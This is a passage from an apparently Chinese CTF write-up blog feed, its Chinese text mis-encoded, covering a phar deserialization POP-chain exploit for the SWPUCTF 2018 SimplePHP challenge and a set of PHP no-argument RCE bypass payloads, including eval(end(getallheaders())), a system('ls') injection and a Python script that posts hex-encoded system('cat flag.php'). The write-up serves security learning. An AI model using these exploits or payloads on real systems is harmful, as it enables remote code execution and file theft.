punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//åç¼€åå¿…é¡»ä¸º phar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è®¾ç½® stub</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å°†è‡ªå®šä¹‰çš„ meta-data å­˜å…¥ manifest</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"poc.php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"poc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><span class="token comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar.phar'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'phar.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>å°†ç”Ÿæˆçš„<code>phar.jpg</code>ä¸Šä¼ ï¼Œå†åœ¨<code>delete</code>æ“ä½œæ—¶æŠ“åŒ…æ”¹åŒ…ï¼Œå¦‚ä¸‹ï¼Œå³å¯æˆåŠŸå¾—åˆ°<code>flag</code>ï¼Œè¯è¯´ä¸ºä»€ä¹ˆæ˜¯<code>flag.txt</code>æˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œä¸€èˆ¬ä¸æ˜¯ç›´æ¥<code>flag</code>å—ï¼Ÿ-.-</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504221851430.png" alt loading="lazy"></p><h4 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h4><p>ç›´æ¥çœ‹å…³é”®ä»£ç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment">//$this->source = phar://phar.jpg</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><code>_show</code>æ–¹æ³•å¹¶æœªè¿‡æ»¤pharï¼Œé¢˜ç›®å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ç‚¹å’Œæ–‡ä»¶åŒ…å«ç‚¹ï¼Œæ˜¾ç„¶æƒ³åˆ°pharåè®®çš„åˆ©ç”¨</p><p>è¿™é¢˜ä¸»è¦éœ€è¦åˆ†æçš„æ˜¯popé“¾ï¼Œåˆ†æä»¥ä¸Šä»£ç å¯ä»¥çŸ¥é“pharçš„åˆ©ç”¨ç‚¹åœ¨<code>file_get_contents</code>å‡½æ•°ï¼Œè€Œè§¦å‘<code>file_get_contents</code>å‡½æ•°éœ€è¦ä»<code>__get-&gt;get-&gt;file_get-&gt;file_get_contents</code>ï¼Œç®€å•æ¥è®²å°±æ˜¯è¦è§¦å‘Testç±»ä¸­çš„<code>__get</code>æ–¹æ³•ï¼Œè€Œ<code>__get</code>æ–¹æ³•çš„è§¦å‘æ¡ä»¶æ˜¯éœ€è¦å¯¹è±¡è¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼ï¼Œå†çœ‹åˆ°Showç±»ä¸­çš„<code>__toString</code>æ–¹æ³•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å¦‚æœä»¤<code>$this-&gt;str[&#39;str&#39;] = new Test()</code>é‚£ä¹ˆä¸å°±å¯ä»¥è§¦å‘Testç±»ä¸­çš„<code>__get</code>æ–¹æ³•äº†å—</p><p>å†æƒ³åˆ°<code>__toString</code>æ–¹æ³•çš„è§¦å‘æ–¹æ³•ï¼Œå½“ä¸€ä¸ªç±»æˆ–å¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¢«è°ƒç”¨ï¼Œåœ¨C1e4rç±»ä¸­åˆšå¥½å¯åˆ©ç”¨</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å¦‚æœä»¤ <code>$this-&gt;str = new Show()</code>å³å¯è§¦å‘</p><p>äºæ˜¯å®Œæ•´popé“¾å¦‚ä¸‹ï¼š</p><p><code>C1e4r::__destruct -&gt; Show::__toSting -&gt; Test::__get</code></p><p>æ³¨æ„ï¼Œè¿™é‡Œ<code>__get</code>æ–¹æ³•ä¸­çš„<code>$key</code>çš„å€¼ä¸ºè§¦å‘è¯¥æ–¹æ³•æ—¶ä¼ å…¥çš„ä¸å¯è®¿é—®å±æ€§çš„å€¼ï¼Œ</p><p>ç®€è€Œè¨€ä¹‹å°±æ˜¯å¦‚æœ<code>$this-&gt;str[&#39;str&#39;]-&gt;abc   =====&gt;   __get(abc)</code>ï¼Œè€Œé¢˜ç›®ä¸­çš„æ˜¯å›ºå®šå¥½çš„<code>socure</code>ï¼Œ</p><p>æ‰€ä»¥åªéœ€è¦<code>params[&#39;source&#39;] = &quot;/var/www/html/f1ag.php&quot;</code>å³å¯</p><p>expå¦‚ä¸‹</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/f1ag.php"</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//åç¼€åå¿…é¡»ä¸º phar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è®¾ç½® stub</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å°†è‡ªå®šä¹‰çš„ meta-data å­˜å…¥ manifest</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"poc.php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"poc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><span class="token comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>éšåæ”¹åç¼€ä¸ºjpgå†ä¸Šä¼ ï¼Œç„¶åæ‰¾åˆ°è¯¥æ–‡ä»¶ï¼Œåˆ©ç”¨æ–‡ä»¶åŒ…å«è¯»å–å³å¯get flag</p>]]></content>
      
      
      <categories>
          
          <category> å¤‡å¿˜å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPæ— å‚æ•°RCE</title>
      <link href="posts/4f9c9406/"/>
      <url>posts/4f9c9406/</url>
      
        <content type="html"><![CDATA[<p>è†œè†œè†œè†œè†œè†œï¼ˆè¿™ä¸œè¥¿çœŸçš„æ˜¯å¥‡æ·«æŠ€å·§ï¼‰</p><p><strong>åˆ©ç”¨æ¡ä»¶</strong>ï¼š<code>eval($_GET[&#39;exp&#39;]);</code></p><p><strong>é™åˆ¶æ¡ä»¶</strong>ï¼š<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $exp)</code></p><span id="more"></span><p><strong>ç›®å½•ä¸‹æ–‡ä»¶</strong>ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429110200063.png" alt loading="lazy"></p><h4 id="æµ‹è¯•ä»£ç "><a href="#æµ‹è¯•ä»£ç " class="headerlink" title="æµ‹è¯•ä»£ç "></a><strong>æµ‹è¯•ä»£ç </strong></h4><pre class="language-php" data-language="php"><code class="language-php">//index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><code>(?R)</code>å¼•ç”¨å½“å‰è¡¨è¾¾å¼ï¼Œåé¢åŠ äº†<code>?</code>é€’å½’è°ƒç”¨</p><p>ä»¥ä¸Šæ­£åˆ™è¡¨è¾¾å¼åªåŒ¹é…<code>a(b(c()))</code>æˆ–<code>a()</code>è¿™ç§æ ¼å¼ï¼Œä¸åŒ¹é…<code>a(&quot;123&quot;)</code>ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¼ å…¥çš„å€¼å‡½æ•°ä¸èƒ½å¸¦æœ‰å‚æ•°</p><h4 id="Payload1-getenv"><a href="#Payload1-getenv" class="headerlink" title="Payload1-getenv()"></a>Payload1-getenv()</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å¯ä»¥è·å–æ•æ„Ÿä¿¡æ¯</p><ul><li><strong>getenv()</strong>ï¼šè·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼ï¼Œ<code>phpinfo()</code>å¯ä»¥è·å–æ‰€æœ‰ç¯å¢ƒå˜é‡</li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429113257924.png" alt loading="lazy"></p><h4 id="Payload2-getallheaders"><a href="#Payload2-getallheaders" class="headerlink" title="Payload2-getallheaders()"></a><strong>Payload2</strong>-getallheaders()</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token function">getallheaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>RCE</p><ul><li><strong>end()</strong>ï¼šå°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æœ€åä¸€ä¸ªå•å…ƒ</li><li><strong>getallheaders()</strong>ï¼šè·å–å…¨éƒ¨ HTTP è¯·æ±‚å¤´ä¿¡æ¯</li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429114144142.png" alt loading="lazy"></p><h4 id="Payload3-get-defined-vars"><a href="#Payload3-get-defined-vars" class="headerlink" title="Payload3-get_defined_vars()"></a>Payload3-get_defined_vars()</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">get_defined_vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>flag<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>åˆ©ç”¨å…¨å±€å˜é‡è¿›RCE</p><ul><li><strong>get_defined_vars()</strong>ï¼šè¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ï¼Œä¼šè¿”å›<code>$_GET,$_POST,$_COOKIE,$_FILES</code>å…¨å±€å˜é‡çš„å€¼</li><li><strong>current()</strong>ï¼šè¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒï¼Œåˆå§‹æŒ‡å‘æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå•å…ƒï¼Œä¹Ÿå°±æ˜¯ä¼šè¿”å›<code>$_GET</code>å˜é‡çš„æ•°ç»„å€¼</li><li><strong>get_defined_vars()</strong>ï¼šè¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ï¼Œæ­¤å‡½æ•°è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡åˆ—è¡¨çš„å¤šç»´æ•°ç»„ï¼Œè¿™äº›å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡ã€‚è¿”å›æ•°ç»„é¡ºåºä¸º<code>get-&gt;post-&gt;cookie-&gt;files</code></li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429115651090.png" alt loading="lazy"></p><p>è€Œå¦‚æœç½‘ç«™å¯¹<code>$_GET,$_POST,$_COOKIE</code>éƒ½åšçš„è¿‡æ»¤ï¼Œ é‚£æˆ‘ä»¬åªèƒ½ä»<code>$_FILES</code>å…¥æ‰‹äº†ï¼Œexpå¦‚ä¸‹ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">str2hex</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>  txt <span class="token operator">=</span> <span class="token string">''</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> payload<span class="token punctuation">:</span>      txt <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token keyword">return</span> txtpayload <span class="token operator">=</span> str2hex<span class="token punctuation">(</span><span class="token string">"system('cat flag.php');"</span><span class="token punctuation">)</span>files <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    payload<span class="token punctuation">:</span> <span class="token string">b'extrader'</span><span class="token punctuation">&#125;</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://192.168.0.107/index.php?exp=eval(hex2bin(array_rand(end(get_defined_vars()))));"</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>  <span class="token comment"># allow_redirects=False ç¦ç”¨é‡å®šå‘å¤„ç†</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><ul><li><strong>array_rand()</strong>ï¼šä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒï¼Œå¦‚æœåªå–å‡ºä¸€ä¸ªï¼Œ<code>array_rand()</code>è¿”å›éšæœºå•å…ƒçš„é”®åã€‚ å¦åˆ™å°±è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚</li><li><strong>end()</strong>ï¼šå°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æœ€åä¸€ä¸ªå•å…ƒ</li><li><strong>hex2bin()</strong>ï¼šè½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</li></ul><p>ç»“æœå°†è¾“å‡º<code>flag.php</code>æ–‡ä»¶çš„å…¨éƒ¨å†…å®¹ï¼Œç”±äºç©ºæ ¼å’Œç‚¹éƒ½ä¼šè¢«æ›¿æ¢æˆä¸‹æ¢çº¿ï¼Œæ‰€ä»¥éœ€è¦ç”¨åå…­è¿›åˆ¶è¿›è¡Œç»•è¿‡</p><h4 id="Payload4-session-start"><a href="#Payload4-session-start" class="headerlink" title="Payload4-session_start()"></a>Payload4-session_start()</h4><p>æ–‡ä»¶è¯»å–ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 